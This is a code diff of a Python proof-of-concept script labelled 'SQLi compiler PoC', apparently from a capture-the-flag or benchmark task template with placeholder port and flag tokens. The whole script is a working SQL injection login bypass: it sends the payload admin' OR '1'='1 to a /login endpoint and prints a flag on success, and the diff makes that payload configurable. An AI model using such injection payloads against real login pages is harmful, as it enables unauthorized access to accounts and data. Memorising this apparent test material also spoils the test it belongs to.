@@ -4,12 +4,12 @@ import sys
 
 SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
 FLAG_TOKEN = '__FLAG_TOKEN__'
-DEFAULT_PARAMS = {'username': "admin' OR '1'='1", 'password': 'irrelevant'}
+DEFAULT_PAYLOAD = "admin' OR '1'='1"
 
-def exploit(base_url: str) -> bool:
+def exploit(base_url: str, payload: str) -> bool:
     url = base_url.rstrip('/') + '/login'
     try:
-        resp = requests.get(url, params=DEFAULT_PARAMS, timeout=5)
+        resp = requests.get(url, params={'username': payload, 'password': 'irrelevant'}, timeout=5)
         resp.raise_for_status()
     except requests.RequestException as exc:
         print(f'[sqli-compiler] request failed: {exc}', file=sys.stderr)
@@ -24,8 +24,9 @@ def exploit(base_url: str) -> bool:
 def main() -> None:
     parser = argparse.ArgumentParser(description='SQLi compiler PoC')
     parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
     args = parser.parse_args()
-    if exploit(args.base_url):
+    if exploit(args.base_url, args.payload):
         print(SUCCESS_SIGNATURE)
         print(FLAG_TOKEN)
         raise SystemExit(0)
